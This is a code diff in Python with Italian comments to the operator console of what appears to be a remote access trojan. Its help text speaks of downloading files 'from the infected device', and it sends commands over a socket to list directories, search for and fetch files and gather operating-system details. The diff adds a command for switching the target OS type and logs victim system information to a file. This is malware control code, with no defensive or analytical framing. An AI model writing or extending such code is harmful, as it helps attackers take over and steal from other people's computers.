@@ -81,11 +81,11 @@ def AssegnaWinFlag(connectionSocket: socket):
     windowsFlag = connectionSocket.recv(2).decode()
 
 
-def LogOnFile(strPerFile: str):  # da usare da tutti per salvare i dati?
+def LogOnFile(nomeFile: str, strPerFile: str):  # da usare da tutti per salvare i dati?
     try:
-        f = open("dati.txt", "a")  # forse dovremmo resettare il file a ogni avvio?
+        f = open(nomeFile, "a")  # forse dovremmo resettare il file a ogni avvio?
     except:
-        f = open("dati.txt", "w")
+        f = open(nomeFile, "w")
     f.write(strPerFile)
     f.close()
 
@@ -136,7 +136,7 @@ def main():
             help = "infoOs                          ricevi informazioni del sistema operativo\nsearch [nome file]              cerca un file nel " \
                    "filesystem \nget [nome file]                 scarica il file dal dispositivo infetto\nesc                             chiudi la " \
                    "sessione \nhelp                            guida comandi\ncd                              change directory\ndir/ls                          listing " \
-                   "directory \ncls                             clear console\npwd                             print working directory"
+                   "directory \ncls                             clear console\npwd                             print working directory\nsetOs to change osType"
             while not esc:
                 cmd = input('>>')
                 connectionSocket.send(cmd.encode())
@@ -145,6 +145,9 @@ def main():
                     print("cls")
                     clearScreen()
 
+                elif cmd == "setOs":
+                    global windowsFlag
+                    windowsFlag = input()
                 elif cmd == "dir" or "ls" in cmd:
                     receiveDir(connectionSocket)
 
@@ -163,7 +166,7 @@ def main():
                 elif cmd == "infoOs":
                     d = connectionSocket.recv(1024).decode()
                     print(d)
-                    LogOnFile(d)
+                    LogOnFile("infoOs.txt", d)
 
                 elif "search" in cmd:
                     cmd = cmd + " "
